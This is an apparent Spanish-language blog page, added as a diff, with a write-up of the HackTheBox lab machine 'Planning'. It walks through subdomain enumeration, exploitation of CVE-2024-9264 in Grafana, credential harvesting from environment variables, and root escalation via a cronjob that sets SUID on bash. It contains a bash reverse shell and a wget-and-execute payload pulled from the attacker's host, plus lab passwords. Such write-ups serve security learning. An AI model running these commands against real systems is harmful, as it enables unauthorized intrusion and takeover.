@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Planning | ZsZsec</title>
+<meta content="Grafana CVE, enumeración de subdominios, cronjobs expuestos y escalada usando SUID bash." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">HackTheBox</p>
+<h1>Planning<span>_</span></h1>
+<div class="writeup-meta"><span>HackTheBox / Grafana / Cron</span></div>
+<div class="tag-row"><span class="tag">HackTheBox</span><span class="tag">Grafana</span><span class="tag">Cron</span><span class="tag">SUID</span><span class="tag">Linux</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body"><hr/>
+<p>tags:</p>
+<ul>
+<li>Nmap</li>
+<li>CronJobs</li>
+<li>Subdominios</li>
+<li>Grafana</li>
+<li>RevShell</li>
+<li>wget</li>
+<li>ssh-L</li>
+<li>ssh</li>
+<li>chmod</li>
+<li>RCE</li>
+<li>Port_Forwarding</li>
+<li>Escalada_Privilegios</li>
+<li>root</li>
+<li>Shell</li>
+<li>Docker</li>
+<li>SUID</li>
+<li>CVE-2024-9264</li>
+<li>FFUF</li>
+<li>Netcat</li>
+<li>CronTab</li>
+<li>Linux</li>
+</ul>
+<hr/>
+<p>Nos enfrentamos contra una maquina linux level easy en donde nos proporcionan unas credenciales para acceder <code>admin / 0D5oT70Fq13EvB5r</code></p>
+<h2>Nmap</h2>
+<p>El primer paso es utilizar la herramienta nmap y realizar un escaneo basico de puertos. Utilizaremos los siguientes parametros <code>nmap -A -sV --top-ports 100</code> y este es el resultado del escaneo</p>
+<pre><code class="language-bash">─(kali㉿kali)-[~]
+└─$ nmap -A -sV --top-ports 100 10.10.11.68
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 16:29 EDT
+Nmap scan report for 10.10.11.68
+Host is up (0.39s latency).
+Not shown: 98 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
+|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://planning.htb/
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   129.95 ms 10.10.14.1
+2   130.41 ms 10.10.11.68
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 70.56 seconds
+
+</code></pre>
+<p>En el escaneo podemos ver que los puertos 22 (ssh) y el puerto 80 (http) se encuentran abiertos entonces el proximo paso sera acceder al http a ver que podemos encontrar</p>
+<h3>Enumeracion de Subdominios</h3>
+<p>Después de realizar un escaneo inicial con <strong>nmap</strong> y analizar el sitio web principal, no encontramos funcionalidades relevantes que pudiéramos explotar. Por lo tanto, decidimos ampliar la superficie de ataque realizando un <strong>escaneo de subdominios virtuales</strong>.</p>
+<p>Utilizamos <strong>ffuf</strong> para llevar a cabo una enumeración de subdominios, aprovechando la técnica de vhosts, enviando el parámetro <code>Host</code> con el patrón <code>FUZZ.planning.htb</code>. Para ello, empleamos el wordlist de <strong>Bitquark top 100000</strong>:</p>
+<pre><code class="language-bash">(kali㉿kali)-[~]
+└─$ ffuf -u http://10.10.11.68 -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host:FUZZ.planning.htb" -fs 178 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.68
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+ :: Header           : Host: FUZZ.planning.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 178
+________________________________________________
+
+grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 114ms]
+:: Progress: [100000/100000] :: Job [1/1] :: 347 req/sec :: Duration: [0:05:13] :: Errors: 0 ::
+
+</code></pre>
+<h4>Resultado:</h4>
+<p>Durante el escaneo se identificó el siguiente subdominio válido:</p>
+<ul>
+<li><strong>grafana.planning.htb</strong> → <strong>[Status: 302]</strong></li>
+</ul>
+<p>El código de estado <strong>302 Found</strong> indica una redirección, lo cual sugiere la presencia de un panel de administración de <strong>Grafana</strong>.</p>
+<h3>¿Qué es Grafana?</h3>
+<p><strong>Grafana</strong> es una plataforma de código abierto ampliamente utilizada para la visualización y monitorización de datos. Permite crear dashboards interactivos que muestran métricas, logs y datos en tiempo real provenientes de diferentes fuentes (bases de datos, servicios cloud, herramientas de monitorización, etc.).</p>
+<p>En entornos corporativos, Grafana suele ser utilizado para supervisar la infraestructura de redes, servidores, aplicaciones y servicios críticos. Debido a su naturaleza de panel de administración, suele estar protegido mediante autenticación, pero si se encuentra mal configurado, expuesto públicamente o con credenciales por defecto, puede ser un punto de entrada muy valioso para un atacante.</p>
+<h3>Relevancia en pentesting</h3>
+<p>Desde el punto de vista de la seguridad ofensiva, encontrar un panel de <strong>Grafana expuesto</strong> puede ser una gran oportunidad, ya que:</p>
+<ul>
+<li><p>Puede permitir el <strong>acceso no autorizado</strong> si no se ha configurado correctamente.</p>
+</li>
+<li><p>Existen <strong>vulnerabilidades conocidas</strong> en versiones antiguas que permiten <strong>escalado de privilegios</strong>, <strong>lectura de archivos locales</strong> (LFI), o incluso <strong>ejecución remota de comandos (RCE)</strong>.</p>
+</li>
+<li><p>Puede revelar <strong>credenciales hardcodeadas</strong>, <strong>tokens API</strong>, y otros datos sensibles.</p>
+</li>
+</ul>
+<h1>GRAFANA  <strong>CVE-2024-9264</strong></h1>
+<p>La vulnerabilidad <strong>CVE-2024-9264</strong> permite a un usuario autenticado en Grafana ejecutar código remoto (RCE) o leer archivos arbitrarios mediante una inyección SQL en DuckDB. Este exploit afecta específicamente a <strong>Grafana v11.0.0</strong> cuando el binario de DuckDB está instalado en el servidor.</p>
+<h3><strong>Requisitos Previos</strong></h3>
+<ol>
+<li><strong>Credenciales válidas</strong> de un usuario en Grafana (ej: <code>admin:0D5oT70Fq13EvB5r</code>).</li>
+<li><strong>DuckDB instalado</strong> en el servidor Grafana (no viene por defecto).</li>
+<li><strong>Script de explotación</strong>: <code>CVE-2024-9264.py</code></li>
+<li>Servidor HTTP local para hospedar archivos maliciosos (ej: <code>shell.php</code>).</li>
+<li>Escucha en un puerto para recibir la reverse shell.</li>
+</ol>
+<h3>Configuracion del Entorno</h3>
+<p>Configuramos un servidor http y Netcat de la siguiente manera</p>
+<pre><code class="language-bash">─(kali㉿kali)-[~/CVE-2024-9264]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+<pre><code class="language-bash">(kali㉿kali)-[~]
+└─$ nc -lvnp 1443                           
+listening on [any] 1443 ...
+</code></pre>
+<h3>Rev Shell</h3>
+<p>vamos a crear la siguiente reverse shell con este comando</p>
+<pre><code class="language-bash">#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.15.8/1443 0&gt;&amp;1
+</code></pre>
+<p>w#### <code>#!/bin/bash</code></p>
+<ul>
+<li>Esta es la <strong>shebang line</strong>, y le indica al sistema que el script debe ser ejecutado usando el intérprete de bash.</li>
+<li>Es obligatoria si quieres que el script se ejecute correctamente como archivo por sí solo.</li>
+</ul>
+<h4><code>bash -i</code></h4>
+<ul>
+<li>Ejecuta una <strong>nueva instancia interactiva</strong> de bash.</li>
+<li>La <code>-i</code> significa <em>interactive shell</em>, lo cual es necesario para que puedas interactuar con la terminal una vez establecida la conexión.</li>
+<li>Sin <code>-i</code>, la shell remota podría no responder correctamente a tus comandos.</li>
+</ul>
+<h4><code>&gt;&amp; /dev/tcp/10.10.15.8/1443</code></h4>
+<ul>
+<li>Esta parte redirige tanto la <strong>salida estándar</strong> (<code>stdout</code>) como la <strong>salida de errores</strong> (<code>stderr</code>) hacia la conexión TCP.</li>
+<li><code>/dev/tcp/10.10.15.8/1443</code> es una característica especial de bash (no existe como archivo real), que permite abrir una conexión TCP con esa IP y puerto como si fuera un archivo.</li>
+<li>Es decir, todo lo que el bash imprima (tanto salida como errores) irá a esa conexión.</li>
+</ul>
+<h4><code>0&gt;&amp;1</code></h4>
+<ul>
+<li>Esto redirige la <strong>entrada estándar</strong> (<code>stdin</code>) a la misma conexión donde ya están saliendo los datos (la <code>&amp;1</code> es la salida).</li>
+<li>De esta forma, el atacante puede <strong>enviar comandos desde su máquina</strong> y la shell los interpretará correctamente.</li>
+</ul>
+<h5>Que hace todo conjunto?</h5>
+<ul>
+<li><p>Establece una <strong>reverse shell interactiva</strong> desde el host víctima hacia el atacante (10.10.15.8) en el puerto 1443.</p>
+</li>
+<li><p>Todo lo que escribas en el <code>nc</code> del atacante se enviará a la shell, y todo lo que la shell responda volverá por el mismo canal.</p>
+</li>
+</ul>
+<h2>Inyeccion de Exploit</h2>
+<p>Una vez identificado que el sistema es vulnerable a la <strong>CVE-2024-9264</strong>, ejecutamos el exploit disponible públicamente, proporcionando las credenciales válidas del usuario <code>admin</code> y utilizando el parámetro <code>-c</code> para inyectar un payload con el objetivo de obtener una reverse shell.</p>
+<p>El exploit utilizado es el siguiente:</p>
+<pre><code class="language-bash">(planning)─(kali㉿kali)-[~/CVE-2024-9264]
+└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.15.8:8000/shell.php -O /tmp/shell.php &amp;&amp; chmod +x /tmp/shell.php &amp;&amp; /tmp/shell.php" http://grafana.planning.htb
+[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Executing command: wget http://10.10.15.8:8000/shell.php -O /tmp/shell.php &amp;&amp; chmod
++x /tmp/shell.php &amp;&amp; /tmp/shell.php
+</code></pre>
+<p>Este comando realiza lo siguiente:</p>
+<ul>
+<li><p><code>-u admin -p 0D5oT70Fq13EvB5r</code>: especifica las credenciales válidas para autenticarse.</p>
+</li>
+<li><p><code>-c "&lt;comando&gt;"</code>: inyecta el comando que se ejecutará remotamente mediante la vulnerabilidad RCE.</p>
+</li>
+<li><p><code>http://grafana.planning.htb</code>: especifica la URL del servidor vulnerable.</p>
+</li>
+<li><ul>
+<li><strong><code>wget http://10.10.15.8:8000/shell.php -O /tmp/shell.php</code></strong></li>
+</ul>
+</li>
+</ul>
+<p>Descarga un archivo malicioso (<code>shell.php</code>) desde mi servidor atacante al directorio <code>/tmp</code> de la máquina víctima.</p>
+<ul>
+<li><p><strong><code>chmod +x /tmp/shell.php</code></strong><br/>
+Cambia los permisos del archivo descargado para hacerlo ejecutable.</p>
+</li>
+<li><p><strong><code>/tmp/shell.php</code></strong><br/>
+Ejecuta el script descargado, el cual contiene una reverse shell en Bash que conecta de vuelta a mi máquina atacante (IP 10.10.15.8, puerto 1443).</p>
+</li>
+</ul>
+<h2>Conexion RCE</h2>
+<p>Una vez ejecutado el payload remoto logramos establecer una conexion exitosa con la maquina victima</p>
+<pre><code class="language-bash">(kali㉿kali)-[~]
+└─$ nc -lvnp 1443                           
+listening on [any] 1443 ...
+connect to [10.10.15.8] from (UNKNOWN) [10.10.11.68] 42376
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@7ce659d667d7:~# 
+</code></pre>
+<p>Como se observa en la shell recibida, la conexión proviene de la IP interna <code>10.10.11.68</code> y se obtiene acceso como <strong>usuario root</strong> dentro del contenedor, lo que indica una explotación exitosa de la vulnerabilidad RCE. A partir de este punto, ya es posible interactuar con el sistema comprometido y continuar con la post-explotación o la posible escalada de privilegios hacia el host, si es necesario.</p>
+<p>Una vez obtenida la shell reversa dentro del contenedor, se procede a buscar información sensible que pueda permitir acceso persistente o privilegios adicionales. Se navega hasta el directorio de trabajo de Grafana ubicado en:</p>
+<pre><code class="language-bash">root@7ce659d667d7:/# cd var/lib/grafana
+cd var/lib/grafana
+</code></pre>
+<p>Desde allí, se ejecuta el comando <code>env</code> para listar las <strong>variables de entorno</strong> disponibles en el entorno del contenedor, lo cual es una práctica común para descubrir credenciales hardcodeadas o configuraciones sensibles:</p>
+<pre><code class="language-bash">root@7ce659d667d7:/var/lib/grafana# env
+env
+AWS_AUTH_SESSION_DURATION=15m
+HOSTNAME=7ce659d667d7
+PWD=/var/lib/grafana
+AWS_AUTH_AssumeRoleEnabled=true
+GF_PATHS_HOME=/usr/share/grafana
+AWS_CW_LIST_METRICS_PAGE_LIMIT=500
+HOME=/usr/share/grafana
+AWS_AUTH_EXTERNAL_ID=
+SHLVL=2
+GF_PATHS_PROVISIONING=/etc/grafana/provisioning
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+GF_SECURITY_ADMIN_USER=enzo
+GF_PATHS_DATA=/var/lib/grafana
+GF_PATHS_LOGS=/var/log/grafana
+PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+AWS_AUTH_AllowedAuthProviders=default,keys,credentials
+GF_PATHS_PLUGINS=/var/lib/grafana/plugins
+GF_PATHS_CONFIG=/etc/grafana/grafana.ini
+_=/usr/bin/env
+OLDPWD=/
+</code></pre>
+<h1>SSH</h1>
+<p>Con las credenciales que previamente adquirimos vamos a proceder a conectarnos al servicio de SSH con el siguiente comando</p>
+<pre><code class="language-bash">                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ ssh enzo@10.10.11.68        
+enzo@10.10.11.68's password: 
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri May 16 08:57:27 AM UTC 2025
+
+  System load:           0.0
+  Usage of /:            65.1% of 6.30GB
+  Memory usage:          41%
+  Swap usage:            0%
+  Processes:             235
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.11.68
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:a99e
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Fri May 16 08:57:31 2025 from 10.10.15.8
+</code></pre>
+<p>Una vez adentro procederemos a realizar los siguientes comandos de reconocimiento y nos encontraremos con el user.txt</p>
+<pre><code class="language-bash">enzo@planning:~$ pwd
+/home/enzo
+enzo@planning:~$ ls
+user.txt
+enzo@planning:~$ cat user.txt
+[redacted]
+enzo@planning:~$ 
+</code></pre>
+<h2>Escalada de Privilegios</h2>
+<p>Durante la fase de enumeración posterior a la obtención de la shell como el usuario <code>enzo</code>, realizamos un recorrido por el sistema de archivos en busca de configuraciones inusuales o posibles vectores de escalada de privilegios. Al inspeccionar el directorio <code>/opt</code>, encontramos una carpeta interesante llamada <code>crontabs</code>:</p>
+<pre><code class="language-bash">enzo@planning:~$ cd ../..
+enzo@planning:/$ ls
+bin                dev   lib64              mnt   run                 sys
+bin.usr-is-merged  etc   lib.usr-is-merged  opt   sbin  
+boot               home  lost+found         proc  sbin.u
+cdrom              lib   media              root  srv   
+enzo@planning:/$ cd opt
+enzo@planning:/opt$ ls
+containerd  crontabs
+enzo@planning:/opt$ cd crontabs
+</code></pre>
+<p>Dentro de <code>crontabs</code> se hallaba un archivo llamado <code>crontab.db</code>:
+bash</p>
+<p>enzo@planning:/opt/crontabs$ ls
+crontab.db
+enzo@planning:/opt/crontabs$ cat crontab.db
+{"name":"Grafana backup","command":"/usr/bin/docker saverafana.tar &amp;&amp; /usr/bin/gzip /var/backups/grafana.tar &amp;&amp; ackups/grafana.tar.gz.zip /var/backups/grafana.tar.gz &amp;&amp;","schedule":"@daily","stopped":false,"timestamp":"Fri Foordinated Universal Time)","logging":"false","mailing":ed":false,"_id":"GTI22PpoJNtRKg0W"}
+{"name":"Cleanup","command":"/root/scripts/cleanup.sh",":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Cgging":"false","mailing":{},"created":1740849309992,"savYX"}</p>
+<p>Al inspeccionarlo, encontramos entradas en formato JSON que parecían representar tareas programadas por un sistema alternativo de cron (posiblemente gestionado mediante una interfaz web):</p>
+<p>A pesar de que algunas partes del JSON están corruptas o malformateadas, se puede observar claramente que hay una tarea llamada <strong>"Cleanup"</strong> que ejecuta el siguiente comando:</p>
+<pre><code class="language-bash">/root/scripts/cleanup.sh
+</code></pre>
+<p>El hecho de que ese script se encuentre en <code>/root/</code> sugiere que podría ejecutarse como el usuario <code>root</code>, lo que representa una <strong>oportunidad de escalada de privilegios</strong>, si logramos modificar ese archivo o inyectar una tarea personalizada.</p>
+<h3>Port forwarding para acceder al panel web</h3>
+<p>Dado que la tarea <code>"Grafana backup"</code> menciona <code>docker</code>, <code>grafana</code> y rutas como <code>/var/backups/</code>, es probable que exista una <strong>interfaz web que gestione estas tareas de cron desde localhost</strong> (por ejemplo, una app Node.js, Flask o similar).</p>
+<p>Procedemos a establecer un túnel SSH con port forwarding:</p>
+<pre><code class="language-bash">(kali㉿kali)-[~]
+└─$ ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
+enzo@planning.htb's password: 
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri May 16 09:28:51 AM UTC 2025
+
+  System load:           0.0
+  Usage of /:            65.2% of 6.30GB
+  Memory usage:          43%
+  Swap usage:            0%
+  Processes:             243
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.11.68
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:a99e
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Fri May 16 09:29:29 2025 from 10.10.15.8
+
+</code></pre>
+<p>Contraseña del usuario <code>enzo</code>: <code>RioTecRANDEntANT!</code></p>
+<p>Con esto, accedemos a la interfaz en nuestro navegador visitando <code>http://localhost:8000</code>, donde probablemente podremos:</p>
+<ul>
+<li><p>Ver o editar tareas de cron.</p>
+</li>
+<li><p>Crear nuevas tareas maliciosas.</p>
+</li>
+<li><p>Inyectar comandos para obtener una <strong>reverse shell como root</strong> o leer directamente el <code>root.txt</code>.</p>
+</li>
+</ul>
+<h3>Crear una tarea cron para escalar privilegios a root</h3>
+<p>Ahora que estamos en el paso final, que consiste en <strong>crear una nueva tarea programada (cronjob)</strong> para escalar privilegios y obtener acceso como usuario <code>root</code>.</p>
+<p>El objetivo es usar cron para ejecutar un comando que copie el binario de Bash en el directorio <code>/tmp</code> y luego le establezca el <strong>bit SUID</strong>. Esto nos permitirá ejecutar esa copia de Bash con permisos de root.</p>
+<p>El comando que colocamos en la tarea cron es:</p>
+<pre><code class="language-bash">cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash
+</code></pre>
+<p><img alt="CRONJOBS" src="https://github.com/user-attachments/assets/6791c158-54da-4b5f-8647-8d7203240b74"/></p>
+<p>Luego de ejecutar el cron job, nos dirigimos a la carpeta <code>/tmp</code>, donde ya se encuentra copiado el binario de <code>bash</code> con el bit SUID activado. Esto nos permite ejecutar ese binario con permisos de root. Usamos los siguientes comandos:</p>
+<pre><code class="language-bash">enzo@planning:/tmp$ ls
+bash
+systemd-private-85bfd5b47fa744c6a8f73000c82d9913-fwupd.service-4OsbDs
+systemd-private-85bfd5b47fa744c6a8f73000c82d9913-ModemManager.service-wexOSp
+systemd-private-85bfd5b47fa744c6a8f73000c82d9913-polkit.service-eeUgaJ
+systemd-private-85bfd5b47fa744c6a8f73000c82d9913-systemd-logind.service-rt6ZEl
+systemd-private-85bfd5b47fa744c6a8f73000c82d9913-systemd-resolved.service-fMBUuX
+systemd-private-85bfd5b47fa744c6a8f73000c82d9913-systemd-timesyncd.service-vstRhJ
+systemd-private-85bfd5b47fa744c6a8f73000c82d9913-upower.service-3PClmk
+vmware-root_733-4248680474
+WXioFdKQBvuDNEVQ.stderr
+WXioFdKQBvuDNEVQ.stdout
+YvZsUUfEXayH6lLj.stderr
+YvZsUUfEXayH6lLj.stdout
+
+</code></pre>
+<p>Ahora ejecutamos el binario <code>bash</code> con el flag <code>-p</code> para preservar los privilegios del propietario (root):</p>
+<pre><code class="language-bash">enzo@planning:/tmp$  ./bash -p
+bash-5.2# whoami
+root
+</code></pre>
+<p>Finalmente lo tenemos... ahora solo falta buscar el root.txt que se encuentra en la carpeta <code>/root/root.txt</code></p>
+<pre><code class="language-bash">bash-5.2# cd root
+bash-5.2# ls
+root.txt  scripts
+bash-5.2# cat root.txt
+
+</code></pre>
+<h3>Tecnologías atacadas y cómo se explotaron:</h3>
+<ol>
+<li><p><strong>Docker (mal configurado)</strong><br/>
+Se encontró una entrada en <code>/opt/crontabs/crontab.db</code> que mostraba comandos mal construidos que ejecutaban contenedores Docker. Aunque no se explotó directamente, reveló la presencia de tareas automatizadas como backups, lo cual ayudó a identificar archivos sensibles como scripts en <code>/root/scripts</code>.</p>
+</li>
+<li><p><strong>Crontab personalizado expuesto</strong><br/>
+La presencia del archivo <code>crontab.db</code> en <code>/opt/crontabs</code> reveló información de cronjobs personalizados, incluyendo uno que ejecutaba <code>/root/scripts/cleanup.sh</code>. Esto nos dio una pista sobre una posible <strong>escalada de privilegios</strong> mediante la inyección de comandos en cronjobs ejecutados por el usuario root.</p>
+</li>
+<li><p><strong>Cronjob mal asegurado / ejecución como root</strong><br/>
+Se aprovechó la capacidad de editar cronjobs personalizados o inyectar uno nuevo que ejecutara comandos con privilegios de root. En este caso, se añadió un cronjob que copiaba el binario de bash a <code>/tmp</code> y le aplicaba el bit SUID, permitiendo luego ejecutar un shell como root.</p>
+</li>
+<li><p><strong>SUID Bit Abuse</strong><br/>
+Al establecer el bit SUID en el binario copiado de <code>bash</code>, se permitió escalar privilegios. Al ejecutarlo con <code>./bash -p</code>, el shell resultante tuvo privilegios root sin necesidad de credenciales.</p>
+</li>
+</ol>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
